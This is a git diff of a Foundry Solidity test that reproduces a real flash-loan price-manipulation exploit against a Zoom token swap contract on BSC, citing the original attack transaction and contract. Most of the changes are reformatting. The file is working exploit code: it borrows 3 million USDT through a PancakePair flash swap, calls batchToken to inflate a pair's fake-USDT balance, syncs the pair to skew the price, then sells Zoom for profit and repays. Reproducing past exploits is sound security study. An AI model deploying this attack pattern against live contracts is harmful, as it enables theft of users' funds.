@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 
 import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 // Exploit Alert ref: https://twitter.com/blocksecteam/status/1567027459207606273?s=21&t=ZNoZgSdAuI4dJIFlMaTJeg
 // Origin Attack Transaction: 0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a
@@ -15,8 +15,11 @@ import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 // Attack Contract: 0xb8d700f30d93fab242429245e892600dcc03935d
 
 interface IUSD {
-
-    function batchToken(address[] calldata _addr, uint256[] calldata _num, address token) external;
+    function batchToken(
+        address[] calldata _addr,
+        uint256[] calldata _num,
+        address token
+    ) external;
     function swapTokensForExactTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -26,14 +29,20 @@ interface IUSD {
     ) external returns (uint256[] memory amounts);
     function buy(uint256) external;
     function sell(uint256) external;
-    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
+    function getReserves()
+        external
+        view
+        returns (
+            uint112 _reserve0,
+            uint112 _reserve1,
+            uint32 _blockTimestampLast
+        );
     function sync() external;
-
 }
 
 contract ContractTest is Test {
-
-    IPancakePair PancakePair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); // KIMO/WBNB pair
+    IPancakePair PancakePair =
+        IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); // KIMO/WBNB pair
     address private usdt = 0x55d398326f99059fF775485246999027B3197955;
     address private swap = 0x5a9846062524631C01ec11684539623DAb1Fae58;
     IERC20 Usdt = IERC20(usdt);
@@ -48,38 +57,70 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", Usdt.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "[Start] Attacker WBNB balance before exploit",
+            Usdt.balanceOf(address(this)),
+            18
+        );
 
         // flashloan - Brrow 3,000,000 USDT
-        PancakePair.swap(3_000_000_000_000_000_000_000_000, 0, address(this), new bytes(1));
+        PancakePair.swap(
+            3_000_000_000_000_000_000_000_000,
+            0,
+            address(this),
+            new bytes(1)
+        );
 
         emit log_named_decimal_uint(
-            "[End] After repay, Profit: USDT balance of attacker", Usdt.balanceOf(address(this)), 18
+            "[End] After repay, Profit: USDT balance of attacker",
+            Usdt.balanceOf(address(this)),
+            18
         );
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) public {
         uint256 ba = Usdt.balanceOf(address(this));
         Usdt.approve(swap, 100_000_000_000_000_000_000_000_000_000_000_000_000);
 
         // use usdt to swap zoom
         IUSD(swap).buy(ba);
-        emit log_named_decimal_uint("Zoom balance of attacker:", Zoom.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "Zoom balance of attacker:",
+            Zoom.balanceOf(address(this)),
+            18
+        );
 
         address[] memory n1 = new address[](1);
         n1[0] = pp;
         uint256[] memory n2 = new uint256[](1);
         n2[0] = 1_000_000 ether;
         emit log_named_decimal_uint(
-            "Before manipulate price, Fake USDT balance of pair:", IERC20(fUSDT).balanceOf(address(pp)), 18
+            "Before manipulate price, Fake USDT balance of pair:",
+            IERC20(fUSDT).balanceOf(address(pp)),
+            18
         );
-        emit log_named_decimal_uint("Before manipulate price, Zoom balance of pair:", Zoom.balanceOf(address(pp)), 18);
+        emit log_named_decimal_uint(
+            "Before manipulate price, Zoom balance of pair:",
+            Zoom.balanceOf(address(pp)),
+            18
+        );
         IUSD(batch).batchToken(n1, n2, fUSDT);
 
         emit log_named_decimal_uint(
-            "After manipulate price, Fake USDT balance of pair:", IERC20(fUSDT).balanceOf(address(pp)), 18
+            "After manipulate price, Fake USDT balance of pair:",
+            IERC20(fUSDT).balanceOf(address(pp)),
+            18
         );
-        emit log_named_decimal_uint("After manipulate price, Zoom balance of pair:", Zoom.balanceOf(address(pp)), 18);
+        emit log_named_decimal_uint(
+            "After manipulate price, Zoom balance of pair:",
+            Zoom.balanceOf(address(pp)),
+            18
+        );
 
         // calling pair Fake USDT-Zoom sync() to update latest price
         IUSD(pp).sync();
@@ -88,7 +129,11 @@ contract ContractTest is Test {
         Zoom.approve(swap, baz * 100);
         IUSD(swap).sell(baz);
 
-        emit log_named_decimal_uint("After selling Zoom, USDT balance of attacker:", Usdt.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "After selling Zoom, USDT balance of attacker:",
+            Usdt.balanceOf(address(this)),
+            18
+        );
         //Repay flashloan
         Usdt.transfer(address(PancakePair), (ba * 10_030) / 10_000);
 
@@ -97,5 +142,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
